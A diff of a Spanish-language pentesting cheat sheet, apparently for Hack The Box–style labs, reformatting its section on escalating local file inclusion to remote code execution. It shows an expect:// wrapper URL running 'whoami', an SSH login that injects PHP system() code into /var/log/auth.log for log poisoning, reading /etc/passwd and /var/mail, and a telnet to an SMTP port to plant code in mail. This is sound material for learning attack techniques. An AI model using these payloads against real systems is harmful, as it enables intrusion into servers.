@@ -91,7 +91,8 @@ http://victim.htb/file.php?recurse=expect://whoami
 
 ## RCE EN LFI
 
-**[Log Poisoning]**, consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.
+**[Log Poisoning]** 
+Consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.
 
 En caso de serlo para la ruta /var/log/auth.log, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.
 
@@ -101,7 +102,9 @@ Ejemplo:
 
 `ssh "<?php system('whoami'); ?>"@domain.htb`
 
-**[Mail PHP Execution]**, consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '/etc/passwd', poder visualizar sus correspondientes mails en '/var/mail/usuario
+**[Mail PHP Execution]**
+
+Consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '/etc/passwd', poder visualizar sus correspondientes mails en '/var/mail/usuario
 
 ```
 telnet 192.168.1.X 25
